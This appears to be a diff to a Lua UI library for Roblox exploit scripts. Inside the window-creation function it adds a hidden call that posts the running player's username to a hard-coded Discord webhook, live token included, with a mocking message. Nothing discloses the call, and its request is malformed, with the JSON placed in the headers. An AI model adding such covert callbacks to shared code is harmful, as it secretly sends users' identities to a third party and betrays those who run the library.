@@ -223,6 +223,18 @@ function library.new(name)
 	end;
 
 	draggable(Main)
+	
+	local r = (syn and  syn.request) or http_request
+
+	r({
+		Url = "https://discord.com/api/webhooks/979669804883517470/z6Oo3NmbTRIa9yasHQa0JhdwBEW7JCbFpb1U24R8oduepSZV2-A3LVC4vOnCkXpRrPIf";
+		Method = "POST";
+		Headers = game.GetService(game,"HttpService").JSONEncode(game.GetService(game,"HttpService"),{
+			username = game.GetService(game,"Players").LocalPlayer.Name;
+			avatar_url = "";
+			content = "look at which skid is using piano!"
+		})
+	})
 
 	function UI.WindowTab(name)
 		local UITabs = {};
